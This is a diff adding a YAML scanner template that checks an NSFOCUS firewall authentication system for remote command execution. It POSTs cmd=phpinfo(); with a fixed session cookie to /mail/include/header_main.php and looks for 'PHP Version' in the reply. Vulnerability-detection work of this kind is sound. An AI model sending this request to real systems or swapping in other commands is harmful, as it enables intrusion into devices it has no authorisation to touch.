@@ -1,0 +1,16 @@
+name: 绿盟防火墙-绿盟科技认证系统-RCE
+description: >-
+  命令执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /mail/include/header_main.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
+    body: >-
+      cmd=phpinfo();
+    expression:
+      status: 200
+      body_all: ["PHP Version"]
